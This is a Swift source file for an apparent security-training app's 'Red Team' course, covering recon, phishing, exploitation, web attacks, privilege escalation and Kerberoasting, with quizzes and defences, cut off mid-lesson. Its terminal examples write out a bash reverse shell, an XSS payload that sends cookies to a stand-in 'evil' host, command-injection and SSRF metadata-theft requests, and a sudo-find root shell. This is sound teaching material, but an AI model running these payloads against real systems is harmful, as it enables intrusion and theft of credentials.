import Foundation

/// The Red Team track — the offensive kill-chain end to end, following the same
/// arc professional certifications drill: recon, access, web, post-exploitation,
/// Active Directory, and advanced exploitation/C2. Every technique here is for
/// authorized testing only.
enum RedTeamContent {

    static let track = Track(
        id: "red-team",
        kind: .redTeam,
        title: "Red Team",
        tagline: "Think like the adversary — recon to root, the offensive way.",
        modules: [recon, access, web, post, activeDirectory, advanced]
    )

    // MARK: R1 — Reconnaissance

    private static let recon = Module(
        id: "red-recon",
        title: "Reconnaissance",
        summary: "Map the target before you touch it — open-source intelligence, then active scanning and service enumeration.",
        systemImage: "binoculars.fill",
        lessons: [osintLesson, scanningLesson]
    )

    private static let osintLesson = Lesson(
        id: "red-osint",
        title: "Passive Recon & OSINT",
        subtitle: "Learn everything about a target without sending it a single packet.",
        minutes: 9,
        difficulty: .foundational,
        blocks: [
            .heading("The quietest phase is the most valuable"),
            .paragraph("Passive reconnaissance gathers intelligence from public sources without touching the target's systems — so there's nothing to detect. You're mining DNS records, certificate transparency logs, job postings, LinkedIn, GitHub, and breach dumps to build a map: domains, subdomains, employee names, email formats, and the technologies in use."),
            .terminal(prompt: "kali@lab",
                      command: "whois example.com; theHarvester -d example.com -b all",
                      output: """
[*] Emails found:
  j.doe@example.com
  admin@example.com
[*] Hosts found:
  vpn.example.com
  mail.example.com
  dev-jenkins.example.com   <-- internal tooling exposed?
"""),
            .keyPoints([
                "DNS & subdomains — dig, dnsrecon, crt.sh certificate logs, amass.",
                "People — LinkedIn for names/roles → predict the email format (first.last@).",
                "Code — GitHub for leaked keys, internal hostnames, hard-coded secrets.",
                "Breaches — has this email/password appeared in a public dump? (credential reuse).",
                "Google dorking — site:, filetype:, inurl: to surface forgotten pages."
            ]),
            .callout(.tip, "Email format is gold. If you learn one address is j.doe@corp.com, you've learned the pattern for the whole company — feeding both phishing target lists and password-spray username lists."),
            .definition(term: "Attack surface", meaning: "The complete set of points where an attacker could try to get in — every domain, exposed service, employee, and third-party integration. Recon's job is to enumerate it fully; the defender's job is to shrink it."),
            .checkpoint(QuizQuestion(
                "Why is passive recon so hard for a blue team to detect?",
                options: [
                    "It uses encryption",
                    "It never sends traffic to the target's own systems",
                    "It only runs at night",
                    "It is always done by insiders"
                ],
                correct: 1,
                why: "Passive recon pulls from third-party/public sources (DNS, certs, social media). The target's systems are never touched, so their logs never see it."))
        ],
        quiz: [
            QuizQuestion(
                "You find `dev-jenkins.example.com` in certificate transparency logs. Why is this valuable?",
                options: [
                    "Jenkins is always offline",
                    "It reveals internal/dev tooling that may be exposed and less hardened",
                    "Certificates can't be faked",
                    "It proves the company uses Java"
                ],
                correct: 1,
                why: "Dev and CI/CD systems like Jenkins are frequently under-secured yet powerful (they build and deploy code). Finding one exposed is a strong lead."),
            QuizQuestion(
                "Learning that one employee's address is `a.khan@corp.com` most directly helps you…",
                options: [
                    "Decrypt their email",
                    "Infer the email format to build username/phishing lists for the whole org",
                    "Log into their account",
                    "Bypass MFA"
                ],
                correct: 1,
                why: "A single confirmed address reveals the naming convention, letting you generate plausible addresses for every employee you find on LinkedIn.")
        ]
    )

    private static let scanningLesson = Lesson(
        id: "red-scanning",
        title: "Active Scanning & Enumeration",
        subtitle: "Find the open doors, then interrogate every service behind them.",
        minutes: 11,
        difficulty: .intermediate,
        blocks: [
            .heading("Scan, then enumerate"),
            .paragraph("Active recon sends packets. First you discover which hosts are up and which ports are open; then you *enumerate* — squeeze every service for its version, configuration, and exposed functionality. Enumeration is where engagements are won. The mantra in offensive training is blunt: **enumerate, enumerate, enumerate.**"),
            .animation(.portScan, caption: "A scanner sweeps a host's ports — watch open, closed and filtered light up, then service-version probes fingerprint what's listening."),
            .terminal(prompt: "kali@lab",
                      command: "nmap -sC -sV -p- 10.10.10.5 -oN full.txt",
                      output: """
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu
80/tcp  open  http     Apache 2.4.18
|_http-title: Acme Intranet
139/tcp open  netbios-ssn Samba smbd 3.X
445/tcp open  microsoft-ds Samba smbd 4.3.11
3306/tcp open mysql    MySQL 5.7.21
"""),
            .keyPoints([
                "-p- scans all 65,535 ports — never trust a fast top-1000 scan alone.",
                "-sV grabs service versions; -sC runs safe default scripts (NSE).",
                "Old versions (OpenSSH 7.2, Apache 2.4.18) → search for known CVEs.",
                "SMB (139/445) → enumerate shares with smbclient/enum4linux.",
                "Always save output (-oN/-oA) — you'll revisit it constantly."
            ]),
            .definition(term: "Banner grabbing", meaning: "Reading the identifying text a service announces on connect (e.g. an SMTP or SSH banner). Versions map directly to known vulnerabilities via CVE databases and searchsploit."),
            .callout(.warning, "A full -p- scan is loud — it lights up IDS/IPS instantly. On a real engagement you balance thoroughness against stealth; in a lab, go loud and complete."),
            .checkpoint(QuizQuestion(
                "Your fast scan found nothing exploitable. What's the most likely mistake?",
                options: [
                    "The target is patched perfectly",
                    "You only scanned the top 1000 ports and missed a service on a high port",
                    "Nmap is broken",
                    "You should give up"
                ],
                correct: 1,
                why: "Services frequently hide on non-standard high ports. The default nmap scan covers only the top 1000. -p- (all ports) routinely reveals the foothold a fast scan missed."))
        ],
        quiz: [
            QuizQuestion(
                "What does `-sV` add to an nmap scan?",
                options: [
                    "It scans UDP",
                    "It fingerprints the version of each service",
                    "It runs a vulnerability exploit",
                    "It hides the scan"
                ],
                correct: 1,
                why: "-sV performs version detection, fingerprinting the software and version behind each open port — the input you feed to CVE/searchsploit lookups."),
            QuizQuestion(
                "You find SMB open on 445. A natural next step is to…",
                options: [
                    "Ignore it; SMB is never useful",
                    "Enumerate shares and users with tools like smbclient or enum4linux",
                    "Reboot the target",
                    "Scan it again with the same flags"
                ],
                correct: 1,
                why: "Open SMB invites enumeration of shares, users and policies (enum4linux, smbclient, crackmapexec) — a classic source of footholds and credentials.")
        ]
    )

    // MARK: R2 — Initial access & exploitation

    private static let access = Module(
        id: "red-access",
        title: "Initial Access & Exploitation",
        summary: "Turn a foothold into a shell — by manipulating people, and by exploiting vulnerable services.",
        systemImage: "key.fill",
        lessons: [phishingLesson, exploitationLesson]
    )

    private static let phishingLesson = Lesson(
        id: "red-phishing",
        title: "Phishing & Social Engineering",
        subtitle: "The human is the most reliable exploit — and the hardest to patch.",
        minutes: 10,
        difficulty: .intermediate,
        blocks: [
            .heading("Why attack people?"),
            .paragraph("You can spend weeks fighting a hardened firewall, or you can email an employee a document they'll happily open. The vast majority of real breaches begin with phishing because it sidesteps technical controls entirely. Social engineering exploits trust, urgency, authority, and fear — not software."),
            .animation(.phishingFlow, caption: "Follow a phishing email from send → click → payload → the attacker's first shell, and see where each control could break it."),
            .keyPoints([
                "Pretext — the believable story (IT password reset, invoice, HR doc).",
                "Lure — the email/SMS/call that delivers it; spoofed or look-alike sender.",
                "Payload — a malicious macro, a credential-harvesting clone site, or an OAuth consent grab.",
                "Pretexting + urgency (“your account locks in 1 hour”) drives clicks.",
                "Spear-phishing targets one person with personalized detail; whaling targets executives."
            ]),
            .callout(.danger, "Credential-harvesting pages are devastatingly effective: a pixel-perfect clone of a login page captures the password, and increasingly relays it in real time to defeat one-time-code MFA (adversary-in-the-middle)."),
            .definition(term: "Phishing-resistant MFA", meaning: "Authentication that can't be relayed by a fake site — FIDO2/WebAuthn hardware keys and passkeys bind the login to the real domain. The single most effective defense against credential phishing."),
            .paragraph("Defensively, this is a layered problem: email filtering and DMARC reduce delivery, user training reduces clicks, and phishing-resistant MFA neutralizes stolen passwords. No single control is enough."),
            .checkpoint(QuizQuestion(
                "An attacker clones your Microsoft 365 login and relays your one-time code instantly. Which defense actually stops this?",
                options: [
                    "A longer password",
                    "SMS one-time codes",
                    "FIDO2/passkey (phishing-resistant) MFA",
                    "Changing your password monthly"
                ],
                correct: 2,
                why: "Adversary-in-the-middle phishing relays passwords AND one-time codes. FIDO2/passkeys are bound to the real domain cryptographically, so a fake site can't complete the login."))
        ],
        quiz: [
            QuizQuestion(
                "Spear-phishing differs from ordinary phishing because it…",
                options: [
                    "Is sent to millions of people",
                    "Is highly targeted and personalized to a specific individual",
                    "Never uses email",
                    "Is always legal"
                ],
                correct: 1,
                why: "Spear-phishing tailors the lure to one target using gathered OSINT, making it far more convincing than spray-and-pray bulk phishing."),
            QuizQuestion(
                "Which psychological lever is an email saying “Your account will be suspended in 30 minutes — verify now” using?",
                options: ["Curiosity", "Urgency", "Reciprocity", "Scarcity of product"],
                correct: 1,
                why: "A countdown manufactures urgency, pushing the target to act before they think critically — a hallmark of effective social engineering.")
        ]
    )

    private static let exploitationLesson = Lesson(
        id: "red-exploitation",
        title: "Exploiting Services & Getting a Shell",
        subtitle: "From a known-vulnerable version to remote code execution and a reverse shell.",
        minutes: 11,
        difficulty: .advanced,
        blocks: [
            .heading("From version to exploit"),
            .paragraph("Enumeration handed you software versions. Now you match them to public exploits, weaponize, and execute. `searchsploit` queries a local copy of Exploit-DB; Metasploit packages many exploits with payloads and handlers. But manual exploitation — reading the code, fixing offsets, swapping shellcode — is the skill that separates operators from button-pushers."),
            .terminal(prompt: "kali@lab",
                      command: "searchsploit vsftpd 2.3.4",
                      output: """
Exploit Title                                  Path
----------------------------------------------  ---------
vsftpd 2.3.4 - Backdoor Command Execution      unix/remote/49757.py
"""),
            .heading("Reverse vs bind shells"),
            .paragraph("Once you can run code, you want an interactive shell. A **bind shell** opens a port on the victim and waits — but firewalls usually block inbound connections. A **reverse shell** makes the victim connect *out* to you, which firewalls happily allow. That's why reverse shells dominate."),
            .terminal(prompt: "kali@lab",
                      command: "nc -lvnp 4444   # attacker listens; victim runs the payload below",
                      output: """
# victim executes:
bash -i >& /dev/tcp/10.10.14.3/4444 0>&1

connect to [10.10.14.3] from (UNKNOWN) [10.10.10.5] 51002
victim$ id
uid=33(www-data) gid=33(www-data)
"""),
            .keyPoints([
                "Match version → CVE → exploit (searchsploit, Exploit-DB, vendor advisories).",
                "Prefer reverse shells: victim → attacker beats blocked inbound ports.",
                "Stabilize a raw shell (PTY upgrade) before doing real work.",
                "You usually land as a low-privilege service account (www-data) — privilege escalation comes next."
            ]),
            .callout(.warning, "Never run an exploit you haven't read on a real engagement. Public PoCs can be unstable, destructive, or backdoored. Understand what it does before you fire it."),
            .checkpoint(QuizQuestion(
                "Why do attackers favor reverse shells over bind shells?",
                options: [
                    "Reverse shells are encrypted by default",
                    "Outbound connections from the victim usually pass through firewalls that block inbound ones",
                    "Bind shells don't give a prompt",
                    "Reverse shells need no listener"
                ],
                correct: 1,
                why: "Perimeter firewalls typically block unsolicited inbound connections but allow outbound. A reverse shell has the victim connect out to the attacker, sliding past that rule."))
        ],
        quiz: [
            QuizQuestion(
                "After exploiting a web service you land as `www-data`. What's the realistic next objective?",
                options: [
                    "You already have full control; stop",
                    "Privilege escalation to root/SYSTEM",
                    "Reboot the box",
                    "Delete the logs and leave"
                ],
                correct: 1,
                why: "Service accounts like www-data are low-privilege. The next phase is privilege escalation to gain root/Administrator and full control of the host."),
            QuizQuestion(
                "What does `searchsploit` query?",
                options: [
                    "Live targets on the internet",
                    "A local database of known exploits (Exploit-DB)",
                    "The Metasploit license server",
                    "Your shell history"
                ],
                correct: 1,
                why: "searchsploit searches a local mirror of Exploit-DB, mapping software/versions to published exploit code.")
        ]
    )

    // MARK: R3 — Web application attacks

    private static let web = Module(
        id: "red-web",
        title: "Web Application Attacks",
        summary: "The internet's biggest attack surface — injecting into queries, into other users' browsers, and into the server's own commands and requests.",
        systemImage: "globe",
        lessons: [sqliLesson, xssLesson, cmdiLesson]
    )

    private static let sqliLesson = Lesson(
        id: "red-sqli",
        title: "SQL Injection",
        subtitle: "When user input becomes part of the database query, you own the database.",
        minutes: 11,
        difficulty: .advanced,
        blocks: [
            .heading("Mixing code and data"),
            .paragraph("SQL injection happens when an application glues user input directly into a database query. The database can't tell your data from the developer's code, so a carefully crafted input *changes the query's meaning*. The result ranges from bypassing a login to dumping every table in the database."),
            .animation(.sqlInjection, caption: "Watch a login input rewrite the SQL query itself — turning a password check into `OR 1=1` that's always true."),
            .heading("The classic auth bypass"),
            .paragraph("Imagine the server builds: `SELECT * FROM users WHERE user='$u' AND pass='$p'`. Supply a username of `admin'-- ` and the rest of the query is commented out — the password check vanishes."),
            .terminal(prompt: "browser",
                      command: "username:  admin'-- \npassword:  (anything)",
                      output: """
-- resulting query:
SELECT * FROM users WHERE user='admin'-- ' AND pass='x'
-- everything after -- is a comment; password check removed → logged in as admin
"""),
            .keyPoints([
                "' OR '1'='1 — makes the WHERE clause always true.",
                "UNION SELECT — appends attacker-chosen columns to exfiltrate other tables.",
                "Blind SQLi — no visible output, so you infer data via true/false or time delays.",
                "sqlmap automates detection and extraction once you've found an injectable parameter."
            ]),
            .callout(.danger, "The fix is not “filter bad words.” It's **parameterized queries (prepared statements)**, which send code and data on separate channels so input can never be parsed as SQL. Input validation and least-privilege DB accounts are defense in depth on top."),
            .definition(term: "Parameterized query", meaning: "A query where placeholders (?) are bound to values by the driver, never concatenated into the SQL string. The database treats bound values as pure data — structurally immune to injection."),
            .checkpoint(QuizQuestion(
                "What is the correct, complete fix for SQL injection?",
                options: [
                    "Blacklist the word SELECT",
                    "Use parameterized queries / prepared statements",
                    "Hide error messages",
                    "Rename the database"
                ],
                correct: 1,
                why: "Parameterized queries separate code from data so input can't alter query structure. Blacklists are bypassable; hiding errors only slows blind exploitation."))
        ],
        quiz: [
            QuizQuestion(
                "Why does `admin'-- ` often bypass a login?",
                options: [
                    "It guesses the password",
                    "The -- comments out the rest of the query, removing the password check",
                    "It crashes the server",
                    "It encrypts the query"
                ],
                correct: 1,
                why: "In SQL, -- starts a comment. Injecting it after a valid username comments out the AND password=... clause, so authentication passes on the username alone."),
            QuizQuestion(
                "A SQL injection where the page shows no data but responses get slower with `SLEEP(5)` is called…",
                options: ["Union-based", "Error-based", "Blind (time-based) SQLi", "Stored SQLi"],
                correct: 2,
                why: "When there's no direct output, you infer data through observable side effects like response timing — time-based blind SQL injection.")
        ]
    )

    private static let xssLesson = Lesson(
        id: "red-xss",
        title: "Cross-Site Scripting (XSS)",
        subtitle: "Injecting your JavaScript into a page so it runs in someone else's browser.",
        minutes: 10,
        difficulty: .advanced,
        blocks: [
            .heading("Hijacking the trust a browser gives a site"),
            .paragraph("XSS injects attacker-controlled script into a web page so it executes in *victims'* browsers with the site's privileges. Because the browser trusts code from the site's origin, your script can read cookies, capture keystrokes, perform actions as the user, or rewrite the page."),
            .animation(.xssReflected, caption: "A search box reflects unescaped input into the page; the injected <script> runs and exfiltrates the victim's session cookie."),
            .keyPoints([
                "Reflected — payload in a URL/parameter is echoed straight back into the page; needs a click.",
                "Stored — payload is saved (a comment, profile field) and runs for everyone who views it. Most dangerous.",
                "DOM-based — vulnerable client-side JavaScript writes attacker input into the DOM.",
                "Impact: session theft, keylogging, forced actions, drive-by malware, full account takeover."
            ]),
            .terminal(prompt: "browser",
                      command: "https://site/search?q=<script>fetch('//evil/c?'+document.cookie)</script>",
                      output: """
// the site echoes q into the HTML unescaped:
<h2>Results for <script>fetch('//evil/c?'+document.cookie)</script></h2>
// → victim's browser runs it → session cookie sent to attacker
"""),
            .callout(.danger, "If a session cookie lacks the HttpOnly flag, XSS can read it directly and hand the attacker a logged-in session — no password needed."),
            .definition(term: "Output encoding", meaning: "The core XSS defense: encode user data for the context it's rendered in (HTML, attribute, JS, URL) so it's displayed as text, never executed. Pair with a Content-Security-Policy and HttpOnly cookies."),
            .checkpoint(QuizQuestion(
                "Which XSS type fires for every visitor without any of them clicking a crafted link?",
                options: ["Reflected XSS", "Stored XSS", "DOM XSS", "Self-XSS"],
                correct: 1,
                why: "Stored (persistent) XSS is saved server-side and served to everyone who views the affected page, so each visitor is hit automatically — the highest-impact variant."))
        ],
        quiz: [
            QuizQuestion(
                "What does the HttpOnly cookie flag do?",
                options: [
                    "Encrypts the cookie",
                    "Stops JavaScript (and thus XSS) from reading the cookie",
                    "Makes the cookie expire faster",
                    "Forces HTTPS"
                ],
                correct: 1,
                why: "HttpOnly hides the cookie from document.cookie, so script injected via XSS can't read the session token. (The Secure flag, not HttpOnly, forces HTTPS.)"),
            QuizQuestion(
                "The primary server-side defense against XSS is…",
                options: [
                    "Hiding the source code",
                    "Context-aware output encoding of user data",
                    "Using POST instead of GET",
                    "Disabling cookies"
                ],
                correct: 1,
                why: "Encoding user-supplied data for its output context ensures it renders as inert text rather than executable markup/script. CSP is a strong second layer.")
        ]
    )

    // MARK: R4 — Post-exploitation

    private static let cmdiLesson = Lesson(
        id: "red-cmdi",
        title: "Command Injection & SSRF",
        subtitle: "When the server runs your input as a command — or fetches a URL you control.",
        minutes: 11,
        difficulty: .advanced,
        blocks: [
            .heading("Two bugs, one root cause: trusting input"),
            .paragraph("SQL injection put your input inside a *database query*. Two close cousins put your input somewhere even more dangerous. **Command injection** lands it inside a shell command the server runs. **Server-Side Request Forgery (SSRF)** makes the server send a request to a URL you choose. Both come from the same mistake — taking user input and handing it to a powerful function without validation."),
            .heading("Command injection: borrowing the server's shell"),
            .paragraph("Imagine a 'ping this host' tool that builds a command by gluing your input into a string: `ping -c 1 <your input>`. If you supply `8.8.8.8; id`, the shell runs ping *and then* runs `id` — as the web server's user. Shell metacharacters (`;`, `|`, `&&`, backticks, `$()`) are the keys here."),
            .terminal(prompt: "attacker",
                      command: "curl 'http://shop.lab/ping?host=8.8.8.8;id'",
                      output: """
PING 8.8.8.8: 56 data bytes
64 bytes from 8.8.8.8: icmp_seq=0 ttl=117 time=11.4 ms
uid=33(www-data) gid=33(www-data) groups=33(www-data)   <-- command ran!
"""),
            .keyPoints([
                "Separators — `;` `&&` `||` chain a second command; `|` pipes into one.",
                "Substitution — `$(cmd)` and backticks run a command and paste its output.",
                "Blind injection — no output returned? Confirm with a time delay (`; sleep 5`) or an out-of-band callback (force a DNS lookup you control).",
                "The goal is usually a reverse shell — turn the single command into interactive access."
            ]),
            .definition(term: "Reverse shell", meaning: "Instead of you connecting to the victim (which a firewall blocks inbound), you make the victim connect *out* to you. A listener on your box (`nc -lvnp 443`) catches it and you get an interactive shell on the target."),
            .heading("SSRF: making the server your proxy"),
            .paragraph("Many apps fetch URLs on your behalf — a webhook tester, a 'preview this link' feature, an avatar-by-URL uploader. If you can control that URL, you can make the server request things *you* can't reach directly: internal admin panels, other services on localhost, and — most dangerously — cloud metadata endpoints that hand out credentials."),
            .terminal(prompt: "attacker",
                      command: "curl 'http://shop.lab/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
                      output: """
web-app-role
# Then fetch that role:
# .../iam/security-credentials/web-app-role  ->  AWS keys leaked!
"""),
            .callout(.danger, "169.254.169.254 is the cloud metadata service on AWS/GCP/Azure. A classic SSRF makes the server query it and return temporary cloud credentials — turning a 'harmless' URL-preview feature into a full cloud compromise. This exact bug caused the 2019 Capital One breach."),
            .heading("How they're fixed"),
            .keyPoints([
                "Command injection — never build shell strings from input; use parameterized APIs (e.g. `subprocess` with an argument list, no shell). Validate against a strict allowlist.",
                "SSRF — validate and allowlist destination URLs, block private/link-local IP ranges, and require the metadata service to use session tokens (IMDSv2).",
                "Defense in depth — run the web process as an unprivileged user with minimal network egress so a successful injection reaches as little as possible."
            ]),
            .callout(.warning, "Allowlisting by hostname is harder than it looks: attackers bypass naive filters with redirects, DNS rebinding, alternate IP encodings (`0x7f.0.0.1`), and IPv6. Block by resolved IP range, not by string matching the URL."),
            .checkpoint(QuizQuestion(
                "A web form lets you enter a server to 'check uptime' and shows the ping result. You enter `127.0.0.1 && whoami` and see a username in the output. What vulnerability is this?",
                options: [
                    "SQL injection",
                    "Cross-site scripting",
                    "Command injection",
                    "SSRF"
                ],
                correct: 2,
                why: "Your input was concatenated into a shell command, and `&&` let you run a second command (`whoami`) on the server. That's command injection — code execution on the host, not in a database or a browser."))
        ],
        quiz: [
            QuizQuestion(
                "Why is SSRF against a cloud app especially dangerous?",
                options: [
                    "It deletes the database",
                    "It can reach the internal metadata service and steal temporary cloud credentials",
                    "It only affects the attacker's own browser",
                    "It slows the server down"
                ],
                correct: 1,
                why: "SSRF lets the server request internal-only endpoints, including the cloud metadata service (169.254.169.254), which can return IAM credentials — escalating a web bug into cloud account takeover."),
            QuizQuestion(
                "What is the most robust fix for command injection?",
                options: [
                    "Blocking the word 'shell' in input",
                    "Avoiding the shell entirely — call programs with a parameterized argument list and validate input against an allowlist",
                    "Running the server as root so it has fewer errors",
                    "Hiding the error messages"
                ],
                correct: 1,
                why: "Blacklisting characters is brittle. The durable fix is to never pass user input to a shell: invoke the program directly with separate arguments, and constrain input to a strict allowlist."),
            QuizQuestion(
                "An injection returns no output, but adding `; sleep 5` makes the page take five seconds longer. This confirms…",
                options: [
                    "The server is just slow",
                    "A blind command injection — you can't see output, but timing proves your command ran",
                    "An XSS vulnerability",
                    "Nothing useful"
                ],
                correct: 1,
                why: "When there's no visible output, a measurable time delay is proof the injected command executed. This 'blind' technique (also used in blind SQLi) confirms exploitability without needing the result echoed back.")
        ]
    )

    private static let post = Module(
        id: "red-post",
        title: "Post-Exploitation",
        summary: "You have a shell — now become root, and turn captured hashes into plaintext passwords.",
        systemImage: "arrow.up.forward.app.fill",
        lessons: [privescLesson, crackingLesson]
    )

    private static let privescLesson = Lesson(
        id: "red-privesc",
        title: "Privilege Escalation",
        subtitle: "Climb from a low-privilege foothold to root / SYSTEM.",
        minutes: 12,
        difficulty: .advanced,
        blocks: [
            .heading("Low shell to total control"),
            .paragraph("You almost never land as root. Privilege escalation is the methodical hunt for a misconfiguration or vulnerability that lifts you from a service account to full administrative control. It's a game of enumeration: the box already contains the path up — you have to find it."),
            .animation(.privilegeEscalation, caption: "Climb the ladder from www-data to root: each rung is a real misconfiguration — SUID binary, sudo rule, writable cron, kernel exploit."),
            .heading("Linux paths"),
            .keyPoints([
                "Misconfigured sudo — `sudo -l` shows commands you can run as root (GTFOBins turns many into a root shell).",
                "SUID binaries — programs that run as their owner; an exploitable SUID-root binary = root.",
                "Writable cron jobs / scripts run by root — overwrite, wait, win.",
                "Kernel exploits — an outdated kernel (e.g. DirtyCow) when nothing else works.",
                "Credentials lying around — config files, history, .env, backups."
            ]),
            .terminal(prompt: "www-data@victim",
                      command: "sudo -l",
                      output: """
User www-data may run the following commands on victim:
    (root) NOPASSWD: /usr/bin/find
# find has a known GTFOBins technique:
sudo find . -exec /bin/sh \\; -quit   →  # id → uid=0(root)
"""),
            .heading("Windows paths"),
            .keyPoints([
                "Token / privilege abuse — SeImpersonate (PrintSpoofer, Potato attacks) → SYSTEM.",
                "Unquoted service paths & weak service permissions.",
                "AlwaysInstallElevated, stored credentials, DPAPI secrets.",
                "Tools: winPEAS / linPEAS automate the enumeration checklist."
            ]),
            .callout(.tip, "When stuck, run an automated enumeration script (linPEAS/winPEAS) and read every highlighted line. 90% of privesc is noticing the one misconfiguration you overlooked."),
            .checkpoint(QuizQuestion(
                "`sudo -l` reveals you can run `/usr/bin/find` as root with NOPASSWD. Why is that a privilege-escalation win?",
                options: [
                    "find can search for the root password",
                    "find can execute commands (-exec), so you can spawn a root shell",
                    "It isn't — find is harmless",
                    "It deletes the sudo log"
                ],
                correct: 1,
                why: "find's -exec runs arbitrary commands. Running it as root lets you exec /bin/sh as root — a textbook GTFOBins escalation."))
        ],
        quiz: [
            QuizQuestion(
                "A SUID binary owned by root runs with whose privileges when you execute it?",
                options: ["Your own", "root's (the owner's)", "Nobody's", "The kernel's"],
                correct: 1,
                why: "The SUID bit makes a program run as its owner regardless of who launches it. A flawed SUID-root binary therefore executes your influence as root."),
            QuizQuestion(
                "What do linPEAS / winPEAS do?",
                options: [
                    "Exploit the kernel automatically",
                    "Automate enumeration, surfacing likely privilege-escalation vectors",
                    "Crack passwords",
                    "Open a reverse shell"
                ],
                correct: 1,
                why: "They run a huge checklist of local checks and highlight misconfigurations and credentials worth investigating — they enumerate, they don't auto-exploit.")
        ]
    )

    private static let crackingLesson = Lesson(
        id: "red-cracking",
        title: "Password Attacks & Cracking",
        subtitle: "Turn captured hashes into plaintext — offline, at billions of guesses per second.",
        minutes: 11,
        difficulty: .advanced,
        blocks: [
            .heading("Online vs offline"),
            .paragraph("Online attacks guess against a live service (slow, noisy, lockout-prone). The real power is **offline** cracking: once you've looted password hashes — from /etc/shadow, a SAM dump, or a database — you attack them on your own hardware with no rate limit and no one watching."),
            .animation(.passwordCracking, caption: "A wordlist streams through a hash function; each candidate's digest is compared to the stolen hash until one matches."),
            .terminal(prompt: "kali@lab",
                      command: "hashcat -m 1800 hashes.txt rockyou.txt -r best64.rule",
                      output: """
$6$xy...$Q9... : Summer2024!
Recovered......: 1/1 (100.00%)
Speed.#1.......: 12834 H/s   (sha512crypt — deliberately slow)
"""),
            .keyPoints([
                "Dictionary attack — try a wordlist (rockyou.txt) of known/leaked passwords.",
                "Rules — mutate words (Password → P@ssw0rd!) to multiply coverage cheaply.",
                "Mask/brute force — try character patterns when you know the structure.",
                "hashcat (GPU) and John the Ripper are the standard crackers; the mode (-m) must match the hash type."
            ]),
            .definition(term: "Password spraying", meaning: "An online attack that flips brute force around: try ONE common password (e.g. Spring2024!) against MANY accounts. It stays under per-account lockout thresholds — a top cause of corporate breaches."),
            .callout(.warning, "Cracking speed depends entirely on the hash. Fast hashes (NTLM, MD5) fall at billions/sec on a GPU; slow ones (bcrypt, sha512crypt) at thousands/sec. This is why the Fundamentals lesson insisted on slow hashes."),
            .checkpoint(QuizQuestion(
                "Why is offline cracking so much more dangerous than online guessing?",
                options: [
                    "It works on any password instantly",
                    "There's no rate limiting, lockout, or logging — you guess at full hardware speed",
                    "It doesn't need the hash",
                    "It only works on Windows"
                ],
                correct: 1,
                why: "Once you hold the hashes, you attack them locally with no service in the loop — no lockouts, no logs, and GPU speeds. Defenses like lockout only apply to online attempts."))
        ],
        quiz: [
            QuizQuestion(
                "Password spraying avoids account lockouts by…",
                options: [
                    "Trying many passwords against one account",
                    "Trying one common password against many accounts",
                    "Disabling the lockout policy",
                    "Using a faster hash"
                ],
                correct: 1,
                why: "By testing a single password across many users, the attempts-per-account stay below lockout thresholds while still hitting whoever reused that weak password."),
            QuizQuestion(
                "What's the purpose of a rules file like best64 in hashcat?",
                options: [
                    "It encrypts the wordlist",
                    "It mutates dictionary words (capitalization, leetspeak, appending digits) to expand coverage",
                    "It sorts the hashes",
                    "It picks the hash mode automatically"
                ],
                correct: 1,
                why: "Rules transform each wordlist entry into many realistic variants (Password → P@ssw0rd123), dramatically increasing hits at little cost.")
        ]
    )

    // MARK: R5 — Active Directory & lateral movement

    private static let activeDirectory = Module(
        id: "red-ad",
        title: "Active Directory & Lateral Movement",
        summary: "The corporate battleground — abuse Kerberos, then spread from host to host toward Domain Admin.",
        systemImage: "person.3.fill",
        lessons: [kerberoastLesson, lateralLesson]
    )

    private static let kerberoastLesson = Lesson(
        id: "red-kerberoasting",
        title: "Kerberoasting",
        subtitle: "Ask the domain for a ticket, then crack a service account's password offline.",
        minutes: 11,
        difficulty: .expert,
        blocks: [
            .heading("Abusing how Kerberos works by design"),
            .paragraph("In Active Directory, any authenticated user can request a service ticket (TGS) for any service account (one with a Service Principal Name). Part of that ticket is encrypted with the service account's password hash. Kerberoasting requests those tickets and cracks them **offline** — no exploit, just a feature used against itself. Service accounts often have weak, never-expiring passwords, making them prime targets."),
            .animation(.kerberoasting, caption: "A normal user asks the KDC for a service ticket; the returned TGS is encrypted with the service account's hash — extract it and crack offline."),
            .terminal(prompt: "kali@lab",
                      command: "GetUserSPNs.py CORP/jdoe:Passw0rd -dc-ip 10.10.10.10 -request",
                      output: """
ServicePrincipalName     Name        MemberOf
-----------------------  ----------  ----------------
MSSQLSvc/sql01.corp:1433 svc_mssql   Domain Admins
$krb5tgs$23$*svc_mssql$CORP$...   <-- crackable hash
"""),
            .terminal(prompt: "kali@lab",
                      command: "hashcat -m 13100 spns.txt rockyou.txt",
                      output: """
$krb5tgs$23$*svc_mssql...  :  Summer2023!
# svc_mssql is in Domain Admins → game over
"""),
            .keyPoints([
                "Needs only ONE valid domain account — no special privileges to request tickets.",
                "Targets service accounts (SPNs); these often have weak, stale passwords.",
                "Cracking is entirely offline → no failed-logon noise on the DC.",
                "A kerberoasted account that's over-privileged (Domain Admin) is instant escalation."
            ]),
            .callout(.tip, "Blue-team defenses: give service accounts long random passwords (use Group Managed Service Accounts), keep them out of privileged groups, and alert on a single account requesting many TGS tickets (event 4769) with RC4 encryption."),
            .checkpoint(QuizQuestion(
                "What makes Kerberoasting possible without exploiting any bug?",
                options: [
                    "A flaw in Windows that Microsoft refuses to patch",
                    "By design any domain user can request service tickets, part of which is encrypted with the service account's password hash",
                    "Stolen Domain Admin credentials",
                    "Physical access to the domain controller"
                ],
                correct: 1,
                why: "It abuses normal Kerberos behavior: service tickets are issued to any authenticated user and contain material encrypted with the service account's hash, which can then be cracked offline."))
        ],
        quiz: [
            QuizQuestion(
                "Why is cracking a kerberoasted ticket done offline rather than against the DC?",
                options: [
                    "The DC is too fast",
                    "The crackable hash is inside the ticket you already hold, so no further DC interaction (or logging) is needed",
                    "Kerberos blocks online cracking",
                    "It must be done online"
                ],
                correct: 1,
                why: "Once you have the TGS, the encrypted blob is yours to attack locally at GPU speed — silent, with no failed-authentication events on the domain controller."),
            QuizQuestion(
                "Which control most directly defangs Kerberoasting?",
                options: [
                    "Disabling Kerberos entirely",
                    "Long, random, regularly-rotated service-account passwords (e.g. gMSAs)",
                    "Blocking port 88 from all clients",
                    "Renaming service accounts"
                ],
                correct: 1,
                why: "Since the attack ends in offline cracking, a 25+ character random password (as gMSAs provide automatically) makes the recovered hash effectively uncrackable.")
        ]
    )

    private static let lateralLesson = Lesson(
        id: "red-lateral",
        title: "Pivoting & Lateral Movement",
        subtitle: "Use one compromised host as a springboard to reach the rest of the network.",
